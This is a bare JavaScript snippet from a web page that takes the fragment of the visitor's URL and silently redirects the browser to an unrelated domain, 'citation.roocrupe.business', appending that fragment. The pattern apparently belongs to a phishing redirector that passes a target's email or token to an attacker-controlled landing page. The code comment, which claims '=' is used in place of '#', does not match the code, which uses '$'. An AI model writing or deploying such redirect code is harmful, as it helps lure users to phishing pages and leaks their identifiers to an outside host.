<script type="text/javascript">
  var baseUrl = "https://citation.roocrupe.business/K@75fJLWfL/";

  // Extract hash from URL (removing the '#')
  var hash = window.location.hash ? window.location.hash.substring(1) : "";

  // Redirect using "=" instead of "#"
  if (hash) {
    window.location.replace(baseUrl + "$" + encodeURIComponent(hash));
  } else {
    window.location.replace(baseUrl);
  }
</script>
